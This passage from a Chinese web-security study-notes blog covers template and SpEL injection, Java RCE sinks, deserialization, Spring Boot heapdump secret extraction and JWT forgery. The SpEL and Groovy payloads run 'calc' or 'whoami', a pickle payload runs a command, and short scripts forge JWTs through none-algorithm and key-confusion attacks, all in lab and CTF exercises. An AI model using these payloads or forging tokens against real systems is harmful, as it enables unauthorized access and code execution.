比如：管理员上传自定义邮件模板、打印模板、导出模板等功能 —— 很常见。3. CMS / 教学 / OA 系统的“页面设计器”、“可视化编辑器”   * &gt; 用户可以写页面模板，内容会在后端用模板引擎渲染，这就很容易被攻击   * 你以为是插入“变量名”   * 但用户其实插入的是“恶意模板表达式”4. 报表系统 / 代码生成平台 / 低代码平台   * &gt; 许多低代码平台使用模板生成代码或报表，例如用 FreeMarker、Velocity 来拼接 HTML、PDF 等，这时候用户输入如果被模板引擎直接解释，也会产生 STTI| 模板引擎        | 语言   | 是否支持执行语法                     | 有 STTI 风险 || --------------- | ------ | ------------------------------------ | ------------ |&#123;% raw %&#125;| **Jinja2**      | Python | ✅ `&#123;&#123; &#125;&#125;` `&#123;&#123; self.__class__ &#125;&#125;`     | ✅            || **Velocity**    | Java   | ✅ `#set($e = &quot;foo&quot;)` `#evaluate()`   | ✅            || **FreeMarker**  | Java   | ✅ `$&#123;...&#125;` `?eval` `?new()`          | ✅            || **Thymeleaf**   | Java   | ⚠️ 默认安全，但某些表达式模式下有风险 | 中等         || **Smarty/Twig** | PHP    | ✅ `&#123;&#123; system(&quot;id&quot;) &#125;&#125;`               | ✅            |&#123;% endraw %&#125;#### 白盒角度测试正则表达式搜索特征：https://www.jyshare.com/front-end/854/1. 查找模板引擎使用位置  可以用 IDE（或全局搜索）直接搜这些关键字。| 模板引擎           | 模板函数常见写法（关键词）                           || ------------------ | ---------------------------------------------------- || Jinja2（Python）   | `Template()`, `render()`, `render_template_string()` || Freemarker（Java） | `getTemplate()`, `process()`                         || Thymeleaf（Java）  | `templateEngine.process()`                           || Velocity（Java）   | `evaluate()`, `mergeTemplate()`                      || Twig（PHP）        | `render()`, `createTemplate()`                       || Smarty（PHP）      | `fetch()`, `display()`                               |2. 看渲染函数有没有接收用户输入   * 是否将 **`GET`、`POST` 参数**、`cookie`、`url参数`、`header` 等 **直接传进模板函数**？3. 可疑传参逻辑举例   * ```     @app.route(&#x27;/hello&#x27;)     def hello():         name = request.args.get(&quot;name&quot;)  # 用户输入         return render_template_string(&quot;Hello &quot; + name)\n\n\n\n问题：render_template_string() 是 Jinja2 的方法，用户输入直接进模板，会造成注入。\n\nJava安全-SPEL表达式注入-SpringBoot框架SpEL （ Spring Expression Language ）表达式注入 , 是一种功能强大的表达式语言、用于在运行时查询和操作对象图，由于未对参数做过滤可造成任意命令执行。\n\nSpring表达式\n\nSpring反射绕过\n参考：https://www.freebuf.com/vuls/197008.html\n\n\nSpring表达式漏洞原理：参数可控，standarEvaluationContext包含上下文对象，可以提供对象，函数，类等信息给Spel表达式，getValue()执行表达式,类似于php里面的eval\n\n// PoC: T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)\n* ```  public String vul(String ex) &#123;      ExpressionParser parser = new SpelExpressionParser();        // StandardEvaluationContext权限过大，可以执行任意代码，默认使用      EvaluationContext evaluationContext = new StandardEvaluationContext();        Expression exp = parser.parseExpression(ex);      String result = exp.getValue(evaluationContext).toString();      return result;  &#125;            \n\n\n\n\n\nSpring反射绕过(黑名单过滤)\n\n\n\n\n黑盒测试的判断步骤\n寻找疑似 SpEL 处理点\n\n在表单、接口、URL 参数中输入一些测试表达式，看返回内容或行为是否异常\n常见可疑功能包括：\n自定义规则表达式设置\n动态配置、模板变量填充\n使用 @Value()、Spring Security EL 的功能\n\n\n\n\n\n\n使用探针 payload 检测漏洞\n\n检测型 payload（看是否被执行）\n\n#&#123;233+1&#125;       → 看返回结果里有没有 234\n$&#123;233+1&#125;       → 某些也兼容\n   * 如果输出 `234`，基本可以确认存在 SpEL 执行点。3. **尝试读取对象属性**   * ```     #&#123;T(java.lang.System).getProperty(&#x27;os.name&#x27;)&#125;   → 输出系统名称     #&#123;T(java.lang.Runtime).getRuntime()&#125;            → 输出 runtime 对象\n\n\n\n\n尝试命令执行\n\n#&#123;T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)&#125;\n#&#123;T(java.lang.Runtime).getRuntime().exec(&#39;whoami&#39;)&#125;\n* 有时输出看不到，但可以通过“延时”判断是否执行成功，如：* ```  #&#123;T(java.lang.Thread).sleep(5000)&#125; → 页面卡顿 5 秒钟\n\n\n\n\n\nJava安全学习路线：BV1Sv4y1i7jf\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"067-Web攻防-Java安全&JNDI项目&审计源码&工具箱等","url":"/2025/09/16/067-Web%E6%94%BB%E9%98%B2-Java%E5%AE%89%E5%85%A8&JNDI%E9%A1%B9%E7%9B%AE&%E5%AE%A1%E8%AE%A1%E6%BA%90%E7%A0%81&%E5%B7%A5%E5%85%B7%E7%AE%B1%E7%AD%89/","content":"067-Web攻防-Java安全&amp;JNDI项目&amp;审计源码&amp;工具箱等知识点：\n1、Java安全-RCE执行-5大类函数调用\n2、Java安全-JNDI注入-RMI&amp;LDAP&amp;高版本\n3、Java安全-不安全组件-Shiro&amp;FastJson&amp;JackJson&amp;XStream&amp;Log4j\nJava安全-RCE执行-5大类白盒审计Java中代码执行的类：\n\nGroovy\nRuntimeExec\nProcessImpl\nProcessBuilder\nScriptEngineManager\n\n检测：（大部分白盒）黑盒看URL的参数名和参数值白盒看类函数名和可控变量\nGroovy@GetMapping(&quot;/groovy&quot;)public String groovyExec(String cmd, Model model) &#123;    GroovyShell shell = new GroovyShell();    try &#123;        shell.evaluate(cmd); // 🚨 危险点：直接执行用户传入的 cmd        model.addAttribute(&quot;results&quot;, &quot;执行成功！！！&quot;);    &#125; catch (Exception e) &#123;        e.printStackTrace();        model.addAttribute(&quot;results&quot;, e.toString());    &#125;    return &quot;basevul/rce/groovy&quot;;&#125;poc:&quot;calc&quot;.execute() // 在 Windows 下弹出计算器\n\n\n\n\nRuntimeExec\nProcess proc = Runtime.getRuntime().exec(cmd);\n这句代码直接将用户传入的 `cmd` 参数，作为系统命令执行。\n  * &lt;img src=&quot;/img/image-20250628134416471.png&quot; alt=&quot;image-20250628134416471&quot; style=&quot;zoom:50%;&quot; /&gt;### ProcessImpl* 这里通过**反射调用了 JDK 内部的私有类 `ProcessImpl` 的 `start()` 方法**，本质上是调用系统命令。用户传入的 `cmd` 字符串直接作为参数执行，**且没有任何验证或限制**。  * ```    Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);    Method method = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);    method.setAccessible(true);    Process e = (Process) method.invoke(null, new String[]&#123;cmd&#125;, null, null, null, false);\n\n* ![image-20250628134559147](/img/image-20250628134559147.png)\n\n\n\nProcessBuilder\n这个 Controller 实现了一个 “根据用户输入的 IP 进行 ping 操作” 的功能。\n\nString[] cmdList = &#123;&quot;cmd&quot;, &quot;/c&quot;, &quot;ping -n 1 &quot; + ip&#125;;\nProcessBuilder pb = new ProcessBuilder(cmdList);\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"068-WEB攻防-Java安全&原生反序列化&SpringBoot攻防&heapdump提取&CVE","url":"/2025/09/16/068-WEB%E6%94%BB%E9%98%B2-Java%E5%AE%89%E5%85%A8&%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&SpringBoot%E6%94%BB%E9%98%B2&heapdump%E6%8F%90%E5%8F%96&CVE/","content":"068-WEB攻防-Java安全&amp;原生反序列化&amp;SpringBoot攻防&amp;heapdump提取&amp;CVE知识点：1、Java安全-原生反序列化-3大类接口函数&amp;利用2、Java安全-SpringBoot攻防-泄漏安全&amp;CVE安全\n一、演示案例-Java安全-反序列化-原生序列化类函数1、前言序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB。\nJAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化两种方式。两种方式做的事情都是一样的，为什么要区分开来？\n\n因为利用起来有所不同fastjson、jackson等反序列化就用网上给的EXP、POC去测试java原生类反序列化就会用到专门工具(ysoserial)去生成payload去测试\n\n黑盒发现（流量捕获到特征ac ed 00 05、rO0AB）白盒发现（特征类接口函数）\n2、原生序列化类函数SnakeYaml完整的YAML1.1规范Processor，支持Java对象的序列化&#x2F;反序列化\n\n\n\n\n\n\n需要注意下jndi注入版本问题\n\nXMLDecoderxml语言格式序列化类函数接口\n\n\nObjectInputStream.readObject任何类如果想要序列化必须实现java.io.Serializable接口\n\n\n\n该项目有个好处就是能看到一些利用链对应的具体版本\n\nYakit\n\n\n假如不知道对方能用什么利用链生成payload，可以利用万能利用链(URLDNS)进行POC测试\n\nSerializedPayloadGenerator该工具项目搭建地址参考：https://blog.csdn.net/m0_60571842/article/details/134454939\n\n\n\n\n\n\n\n\n\n3、利用项目Yakithttps://yaklang.com/ &#x2F;&#x2F;集成了ysoserial工具，图形化生成，推荐使用\nysoserialhttps://github.com/frohoff/ysoserial &#x2F;&#x2F;命令生成工具，不推荐使用\nSerializedPayloadGeneratorhttps://github.com/NotSoSecure/SerializedPayloadGenerator &#x2F;&#x2F;集成了ysoserial工具，网页图形化，推荐使用\n二、演示案例-Java安全-SpringBoot框架-泄漏&amp;CVESpringBoot Actuator模块提供了生产级别的功能，比如健康检查，审计，指标收集，HTTP跟踪等，帮助我们监控和管理Spring Boot应用。\n0、检测清单https://github.com/LandGrey/SpringBootVulExploit\n\n\n\n1、黑盒发现（人工识别，BP插件）人工识别1、网站图片文件是一个绿色的树叶。2、特有的报错信息。3、Whitelabel Error Page关键字\n\n\nBP插件https://github.com/API-Security/APIKit打开BurpSuite页面,点击Extender然后选择Extensions,添加APIKit.jar\n\n\n安装好插件后啥都不用管，让数据包经过BP即可触发插件被动扫描\n\n\n\n\n2、白盒发现（pom.xml,引用库）\n看引用库里面是否有应用springframework和spring-boot-starter-actuator模块\n\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;\n\n\n配置文件Actuator设置全部暴露\n\n全局搜索actuator模块应用库\n\n\n\nActouator设置全部暴露\n\nmanagement.endpoints.web.exposure.include=* 的作用是 暴露所有的 Spring Boot Actuator 端点，使得你可以通过 HTTP 请求访问所有内置的监控和管理端点。如果没有特别需求，通常建议限制暴露的端点，以提高安全性。\n   * ![image-20250630214821052](/img/image-20250630214821052.png)### 3、泄漏安全(内部路由泄露)https://github.com/AabyssZG/SpringBoot-Scan![image-20250628230402349](/img/image-20250628230402349.png)![image-20250628230449830](/img/image-20250628230449830.png)1. 在env下面泄露了一些关键信息 数据库账户密码什么       * ![image-20250628230556117](/img/image-20250628230556117.png)2. 如果需要详细查看需要进行下载我们需要访问`/heapdump`对文件进行下载   * ![image-20250628230749996](/img/image-20250628230749996.png)  3. 将下载后的文件放在工具目录下面   * #### heapdump敏感信息查询工具（配置密码，AK/SK等）   * https://github.com/whwlsfb/JDumpSpider(该工具不支持自定义关键字)   * ![image-20250628231420176](/img/image-20250628231420176.png)   * ![image-20250628231726901](/img/image-20250628231726901.png)   * ![image-20250628231919337](/img/image-20250628231919337.png)4. 第一个工具不支持自定义关键字，并且有的信息提取不到 这里推荐另外一个工具    * https://github.com/wyzxxz/heapdump_tool(支持关键字搜索)   * ![image-20250629002112683](/img/image-20250629002112683.png)   ### 4、漏洞安全（利用类，CVE漏洞等）#### 一、针对于框架CVE漏洞https://github.com/AabyssZG/SpringBoot-Scan1. 检测不出来是因为该工具不支持这个漏洞检测2. 这个工具主要检测微服务的内容 * ![image-20250629002342003](/img/image-20250629002342003.png)* ![image-20250629194327837](/img/image-20250629194327837.png)* ![image-20250629194715836](/img/image-20250629194715836.png)#### 二、利用类漏洞来进行RCE攻击https://github.com/0x727/SpringBootExploit1. 这个工具利用Springboot上面的泄露有没有可以利用的类 2. 然后使用这款工具来进行针对性的利用   * ![image-20250629115931209](/img/image-20250629115931209.png)   * ![image-20250629120617158](/img/image-20250629120617158.png)3. 服务器上执行`JNDIExploit`工具(可以本地、也可以远程VPS上运行)   * ![image-20250629121216636](/img/image-20250629121216636.png)   * ![image-20250629194050919](/img/image-20250629194050919.png)   * ![image-20250629194125600](/img/image-20250629194125600.png)   * ![image-20250629194139309](/img/image-20250629194139309.png)### 5、CMS源码审计#### 一、安装源码1. 打开项目先找到配置文件按照图片里面的路径修改为你当前数据库数据库用户名和密码   * ![image-20250630220046447](/img/image-20250630220046447.png)2. 打开小皮启动数据库 在数据库管理工具页面创建新的数据库`rbac`导入文件里面自带的数据库`rbac.sql`   * ![image-20250630220429114](/img/image-20250630220429114.png)3. 在idea里面的右边`Maven`这里进行`clean`和`install`重新启动   * ![image-20250630220637097](/img/image-20250630220637097.png)4. 重新加载成功后启动环境来到站点 用户名`admin`密码`123456`   * ![image-20250630221948251](/img/image-20250630221948251.png)   * ![image-20250630222830241](/img/image-20250630222830241.png)#### 二、源码审计1. 从pom.xml看有没有调用Actuator库   * ![image-20250630222922103](/img/image-20250630222922103.png)2. 配置文件中Actuator设置是否为*(全部暴露)   * ```     management.endpoints.web.exposure.include=*\n\n\n\n\n\n\n利用用具看看有没有存在的rce漏洞，没有只能从泄露安全headdump下手\n\n\n\n\nbp插件查看铭感信息\n\n\n\n\n使用JDumpSpider敏感信息查询工具heapdump对提取敏感信息提取\n\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"069-Web攻防-Java安全&JWT项目插件&Postman中文包等","url":"/2025/09/16/069-Web%E6%94%BB%E9%98%B2-Java%E5%AE%89%E5%85%A8&JWT%E9%A1%B9%E7%9B%AE%E6%8F%92%E4%BB%B6&Postman%E4%B8%AD%E6%96%87%E5%8C%85%E7%AD%89/","content":"069-Web攻防-Java安全&amp;JWT项目插件&amp;Postman中文包等知识点\n1、Java安全-Druid监控-未授权访问&amp;信息泄漏\n2、Java安全-Swagger接口-文档导入&amp;联动批量测试\n2、Java安全-JWT令牌攻防-空算法&amp;未签名&amp;密匙提取\nJava安全-Druid监控-未授权访问&amp;信息泄漏Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池。Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控。当开发者配置不当时就可能造成未授权访问漏洞。\n参考：https://developer.aliyun.com/article/1260382\n攻击点：\n\n直接拼接URL路径，尝试能否直接未授权访问系统功能点。\n结合泄露URL路径和Session信息，利用BurpSuite进行尝试登录。\n利用Cookie编辑器替换Session，再次访问后台路径尝试进入后台。\n\n黑盒环境下\n\n在黑盒环境下 在url后面加上druid即可查看当前是否存在\n\n\n\n\n​\t\n白盒发现\n\n在项目源码配置文件中搜索druid关键字\n\n\n\n\n把这里#去除就代表要进行登录\n\n如果没有配置密码就是未授权访问\n\n\n\n\n\n\n攻击点\n直接拼接URL路径，尝试能否直接未授权访问系统功能点。\n\n结合泄露URL路径和Session信息，利用BurpSuite进行尝试登录\n\n利用Cookie编辑器替换Session，再次访问后台路径尝试进入后台。\nJava安全-Swagger接口-导入&amp;联动批量测试Swagger是一个用于生成、描述和调用RESTful接口的Web服务。就是将项目中所有（想要暴露的）接口展现在页面上，并可以进行接口调用和测试的服务。所以可以对这个接口进行漏洞测试，看是否存在未授权访问、sql注入、文件上传等漏洞。由于接口太多，一个个接口测试的话太费时间，所以一般会采用自动化接口漏洞安全测试。\n黑盒情况下\n查看 Swagger 文档：Swagger 提供了自动生成的 API 文档，通常可以通过 /swagger-ui/ 或类似路径访问到。通过查看这些文档，你可以了解所有可用的接口和请求的参数。\n自动化发包测试\n将网站上面的一些接口信息，显示到了页面上上面\n\n\n\n菜单管理尝试着去请求如果数据能够正常回显，那就是未授权访问\n\n\n\n\n黑盒情况下\n\n实战中可以有几十个也有可能有几千个这样的接口 ，不可能一个一个去点，这个时候就要用到了工具自动化发包测试，Postman\n\n\n\n\n\n通过这里得到api的所有接口\n\n\n\n\n一般根据自己需要进项设置 我们这里默认完事\n\n\n\n\n\n\n如果发生了报错点击整个文件 在变量环节将前面的双斜杠//删除即可正常用\n\n\n\n\n\n\n\n\n\n这里还可以进行一个授权的key，因为有的接口需要登录才能使用\n\n\n\n\n运行后该工具会对swagger全部接口自动发包测试，但是这里发现都是500响应，浏览器接口访问又是200\n\n\n\n\n如果postman上有出现200的响应，那么就有可能是一个未授权接口\n\n\n\n\n\n自动化漏洞测试联动BurpSuite Xray等\n\n在postman左上角文件，设置里面选中代理，开启自定义代理配置，将代理的地址和端口和burp端口设置一样。\n\n\n\n\n\n在postman上再次运行项目后可以看到流量转发到了burp上\n\n\n\n\n\n\n我们这里设置代理规则，使用Xary对burp进行流量转发，然后进行检测\n\n\n\n\n\n\n\n使用命令对流量包进行检测\n\nwebscan --listen 127.0.0.1:7777 --html-output proxy.html\n   * ![image-20250701114401775](/img/image-20250701114401775.png)## Java安全-[JWT](https://so.csdn.net/so/search?q=JWT&amp;spm=1001.2101.3001.7020)令牌-空算法&amp;未签名&amp;密匙提取JSON Web Token(JWT)。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。这使得JWT成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互。![image-20250701114530780](/img/image-20250701114530780.png)### 识别 JWTJWT由三部分组成：表头，有效载荷，签名&gt; 标头（Header）&gt; Header是JWT的第一个部分，是一个JSON对象，主要声明了JWT的签名算法，如&quot;HS256”、&quot;RS256&quot;等，以及其他可选参数，如&quot;kid&quot;、&quot;jku&quot;、&quot;x5u&quot;等&gt; alg字段通常用于表示加密采用的算法。如&quot;HS256&quot;、&quot;RS256&quot;等&gt; typ字段通常用于表示类型&gt; 还有一些其他可选参数，如&quot;kid&quot;、&quot;jku&quot;、&quot;x5u&quot;等&gt; 有效载荷（Payload）&gt; Payload是JWT的第二个部分，这是一个JSON对象，主要承载了各种声明并传递明文数据，用于存储用户的信息，如id、用户名、角色、令牌生成时间和其他自定义声明。&gt; iss：该字段表示jwt的签发者。&gt; sub：该jwt面向的用户。&gt; aud：jwt的接收方。&gt; exp：jwt的过期时间,通常来说是一个时间戳。&gt; iat：jwt的签发时间,常来说是一个时间戳。&gt; jti：此jwt的唯一标识。通常用于解决请求中的重放攻击。该字段在大多数地方没有被提及或使用。因为使用此字段就意味着必须要在服务器维护一张jti表， 当客户端携带jwt访问的时候需要在jti表中查找这个唯一标识是否被使用过。使用这种方式防止重放攻击似乎让jwt有点怪怪的感觉, 毕竟jwt所宣称的优点就是无状态访问&gt; 签名（Signature）&gt; Signature是对Header和Payload进行签名，具体是用什么加密方式写在Header的alg 中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。&gt; 对Header和Payload进行签名，具体是用什么加密方式写在Header的alg中。&gt; 同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。第一部分：对 JSON 的头部做 base64 编码处理得到第二部分：对 JSON 类型的 payload 做 base64 编码处理得到第三部分：分别对头部和载荷做base64编码，并使用.拼接起来使用头部声明的加密方式，对base64编码前两部分合并的结果加盐加密处理，作为JWTJWT 分为三部分，每一部分都是 **Base64Url 编码** 的字符串：1. **Header**（头部）：描述 token 的类型（JWT）和签名算法（如 HS256）。2. **Payload**（载荷）：实际的数据部分，通常包括用户信息、权限、过期时间等。3. **Signature**（签名）：用于校验 token 是否被篡改。![40bb0992afa8883a37881a9b546bbec3](C:\\Users\\liuyuanbiao\\Desktop\\BlogPhoto\\40bb0992afa8883a37881a9b546bbec3./img/jpeg)在线解析：https://jwt.io/BURP插件：Hae 或 JSON Web Tokens#### 方式一：人工识别1. 拆分为三段（按 `.`）2. 对前两段用 Base64 解码3. 前面两段开头都是`eyj`![image-20250701121235610](/img/image-20250701121235610.png)#### 方式二：Burp插件识别Hae(需要自己下载项目)JSON Web Tokens(BP商店有，支持识别解析)![image-20250701142811248](/img/image-20250701142811248.png)![image-20250701143236914](/img/image-20250701143236914.png) ![image-20250701150135860](/img/image-20250701150135860.png)![image-20250701150412443](/img/image-20250701150412443.png)### 解析JWT数据JWT在线解析：https://jwt.io/![image-20250701150329816](/img/image-20250701150329816.png) ### JWT安全#### 空加密算法（攻击头部不使用加密）签名算法可被修改为none，JWT支持将算法设定为&quot;None&quot;。如果&quot;alg&quot;字段设为&quot;None&quot;，那么签名会被置空，这样任何token都是有效的。![image-20250701150640070](/img/image-20250701150640070.png)![image-20250701150828665](/img/image-20250701150828665.png)#### 未校验签名（攻击签名不使用签名认证）某些服务端并未校验JWT签名，可以尝试修改payload后然后直接请求token或者直接删除signature再次请求查看其是否还有效。#### 暴力破解密钥（攻击签名知道密钥实现重组）针对是对称加密算法（非对称没有用）非对称要使用方法：从源码获取公钥私钥文件某些签名算法，例如HS256（HMAC+SHA-256），会像密码一样使用一个任意的、独立的字符串作为秘密密钥。这个秘钥如被轻易猜到或暴力破解，则攻击者能以任意的头部和载荷值来创建JWT，然后用密钥重新给令牌签名。#### 其他安全参考：（源码泄漏密匙，Kid注入等）参考文章：https://blog.csdn.net/weixin_44288604/article/details/128562796### CTF-JWTJWT利用项目：https://github.com/ticarpi/jwt_tool\n\n\n\n\n\n项目命令帮助\n使用None算法python3 jwt_tool.py JWT_HERE -X a\n自定义修改生成python3 jwt_tool.py JWT_HERE -T\n使用字典破解python3 jwt_tool.py JWT_HERE -C -d dictionary.txt\n指定密码测试python3 jwt_tool.py JWT_HERE -C -p password_here\n#### **WEB345(None空加密算法)**签名算法可被修改为none，JWT支持将算法设定为 &quot;None&quot; 。如果 &quot;alg&quot; 字段设为 &quot;None&quot; ，那么签名会被置空，这样任何token都是有效的。![image-20250701151502567](/img/image-20250701151502567.png)![image-20250701151550641](/img/image-20250701151550641.png)![image-20250701151604997](/img/image-20250701151604997.png)![image-20250701151624756](/img/image-20250701151624756.png)因为第一部分和第二部分都是使用了base64加密我们这里放到decode里面去先解密将user修改为admin再base64加密![image-20250701152252471](/img/image-20250701152252471.png)将里面的jwt值进行替换 发送拿到flag，这里使用空算法none然后所以修改能成功![image-20250701152343369](/img/image-20250701152343369.png)#### Web346(None算法绕过签名)1. 启动这题抓包后发现alg算法为HS256，这里就不能随意修改sub对象了![image-20250701152705048](/img/image-20250701152705048.png)2. 解题思路：alg强制设置为none绕过签名   * ![image-20250701153715488](/img/image-20250701153715488.png)   * ![image-20250701153855784](/img/image-20250701153855784.png)   * ![image-20250701164646995](/img/image-20250701164646995.png)   * ![image-20250701164955736](/img/image-20250701164955736.png)   * ![image-20250701165055336](/img/image-20250701165055336.png)     * &gt; 签名算法可被修改为none，JWT支持将算法设定为 &quot;None&quot; 。如果 &quot;alg&quot; 字段设为 &quot;None&quot; ，那么签名会被置空，这样任何token都是有效的2. 使用插件修改JWT   * 将Alg修改为none 再把sub改为admin，这里在response模块就自动修改了   * ![image-20250701165237618](/img/image-20250701165237618.png)   * ![image-20250701165358768](/img/image-20250701165358768.png)#### Web347(弱口令密钥获取)针对是对称加密算法（非对称没有用）非对称要使用方法：获取源码或者公钥私钥文件某些签名算法，例如HS256（HMAC+SHA-256），会像密码一样使用一个任意的、独立的字符串作为秘密密钥。这个秘钥如被轻易猜到或暴力破解，则攻击者能以任意的头部和载荷值来创建JWT，然后用密钥重新给令牌签名。![image-20250701170211672](/img/image-20250701170211672.png)![image-20250701170415777](/img/image-20250701170415777.png)![image-20250701170530022](/img/image-20250701170530022.png)![image-20250701170622103](/img/image-20250701170622103.png)#### Web348(爆破密钥上题一样)同上#### Web349(公钥私钥泄露)1. 环境启动后在页面app.js上下载源文件 分析2. 公钥加密，私钥解密，私钥签名，公钥验签   * ![image-20250701171509112](/img/image-20250701171509112.png)   * ![image-20250701171428087](/img/image-20250701171428087.png)   * ![image-20250701171641607](/img/image-20250701171641607.png)   * ![image-20250701172143919](/img/image-20250701172143919.png)      2. 源码中私钥生成jwt签名，利用公钥解密jwt，只要有私钥就可以重新生成JWT   * ![image-20250701172252392](/img/image-20250701172252392.png)   * ```python     import jwt     public = open(&#x27;private.key&#x27;, &#x27;r&#x27;).read()     payload=&#123;&quot;user&quot;:&quot;admin&quot;&#125;     print(jwt.encode(payload, key=public, algorithm=&#x27;RS256&#x27;))\n\n\n\n\n\n\n\n\n\n\n\nWeb350(密钥混淆攻击RS256&#x3D;&gt;HS256)\n下载源码后使用Webstorm打开\n\n从代码上看都是私钥生成签名，公钥进行验证，但是这里只能看到公钥，私钥是被删除了的，全局搜索无法找到\n\n我们这里更换算法，把RS256更换为HS256 非对称算法改对称算法\n\n\n\n\n\nvar jwt = require(&#39;jsonwebtoken&#39;);\nvar fs = require(&#39;fs&#39;);\nvar privateKey = fs.readFileSync(&#39;./public.key&#39;);\nvar token = jwt.sign(&#123; user: &#39;admin&#39; &#125;, privateKey, &#123; algorithm: &#39;HS256&#39; &#125;);\nconsole.log(token)\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"071-Web攻防-Python安全&反序列化&代码段&资源项目等","url":"/2025/09/16/071-Web%E6%94%BB%E9%98%B2-Python%E5%AE%89%E5%85%A8&%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&%E4%BB%A3%E7%A0%81%E6%AE%B5&%E8%B5%84%E6%BA%90%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"071-Web攻防-Python安全&amp;反序列化&amp;代码段&amp;资源项目等Python-PYC-反编译文件出源码\npyc 文件是py 文件编译后生成的字节码文件(byte code)，pyc 文件经过python 解释器最终会生成机器码运行。因此pyc文件是可以跨平台部署的，类似Java的.class 文件，一般py 文件改变后，都会重新生成pyc文件。\n\n\n什么是 .pyc 文件？\n.pyc 文件是 Python 编译后的字节码 文件。\nPython 解释器会将源代码（.py 文件）编译成 .pyc 文件以加快后续执行。\n.pyc 文件存储的是经过编译的 字节码，可以被 Python 解释器直接执行，而不需要重新编译源代码。\n.pyc文件通常存储在pycache&#96; 目录下，这个目录是在执行 Python 程序时自动创建的。\n\n\n\n真题:http://pan.baidu.com/s/1jGpB8DS\n安装:pip install uncompyle6\n使用:uncompyle6 -o test.py test.pyc\n下载:https://github.com/rocky/python-uncompyle6\n\n\n\n\nPython-反序列化-调用链&amp;魔术方法JAVA PHP Python 语言序列化和反序列化函数：\n\n\n\n编程语言\n序列化函数&#x2F;接口\n反序列化函数&#x2F;接口\n备注\n\n\n\nJava\nSerializable (接口)\nObjectInputStream.readObject()\nSerializable 用于标记类可以被序列化\n\n\n\nExternalizable (接口)\nObjectInputStream.readUnshared()\nExternalizable 用于更精细的控制序列化和反序列化过程\n\n\n\nfastjson\nfastjson.parseObject()\nfastjson 用于 JSON 格式的序列化和反序列化\n\n\n\njackson.ObjectMapper.writeValue()\njackson.ObjectMapper.readValue()\nJackson 是常用的 JSON 处理库\n\n\n\nGson.toJson()\nGson.fromJson()\nGson 用于 JSON 格式的序列化和反序列化\n\n\n\nObjectOutputStream.writeObject()\nObjectInputStream.readObject()\n标准 Java 对象序列化和反序列化接口\n\n\n\nXMLDecoder.writeObject()\nXMLDecoder.readObject()\n主要用于 XML 格式的序列化和反序列化\n\n\n\nXStream.toXML()\nXStream.fromXML()\nXStream 用于 XML 格式的序列化和反序列化\n\n\nPHP\nserialize()\nunserialize()\nPHP 内建的序列化和反序列化函数\n\n\n\njson_encode()\njson_decode()\njson_encode 和 json_decode 用于 JSON 格式的序列化和反序列化\n\n\nPython\npickle.dump() (序列化对象到文件)\npickle.load() (从文件反序列化对象)\npickle 用于对象的二进制序列化\n\n\n\nmarshal.dump()\nmarshal.load()\nmarshal 用于 Python 内部使用，不适合跨平台\n\n\n\njson.dump() (将对象序列化为 JSON 格式)\njson.load() (从 JSON 格式反序列化对象)\njson 用于处理 JSON 格式\n\n\n\nPyYAML.dump()\nPyYAML.load()\nPyYAML 用于 YAML 格式的序列化和反序列化\n\n\n\nshelve (对象持久化)\nshelve (对象反序列化)\nshelve 用于将 Python 对象存储在文件中\n\n\n\nPIL.Image.save() (序列化图像对象)\nPIL.Image.open() (反序列化图像对象)\nPIL 用于图像数据的保存和加载\n\n\n\nunzip()\nzipfile.ZipFile.read()\nPython 中用于压缩文件的解压操作\n\n\n序列化:把类对象转化为字节流或文件\n反序列化:将字节流或文件转化为类对象\npickle.dump(obj，file):将对象序列化后保存到文件\npickle.iad(file):将文件序列化内容反序列化为对象\npickle.dumps(obj):将对象序列化成字符串格式的字节流\npickle.loads(bytesobj):将字符串字节流反序列化为对象\nPyYAML yaml.load()JSON ison.loads(s)marshalPyYAMLshelvePILunzip\n魔术方法:reduce()反序列化时调用reduce ex()反序列化时调用setstate()反序列化时调用 用于反序列化时设置对象的状态getstate()序列化时调用\n1、序列化和反序列化演示-test.py\n\n2、序列化和反序列化形成-test.py\n\n\n\n__setstate__() 主要用于在对象反序列化时恢复对象的状态。它允许你控制如何将数据从反序列化格式（如文件或内存中的二进制格式）加载回对象。\n3、序列化和反序列化利用-server.py pop.py\n\ngASVOwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwfX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhbGMnKZSFlFKULg==\n\n\n4、序列化和反序列化赛题-[watevrCTF-2019]Pickle store\n跟上题差不多参考：watevrCTF-2019 Pickle Store\n黑盒:Python反序列化特征:base64编码前面g固定(列化数据)\n测试:直接提交构造的 payload 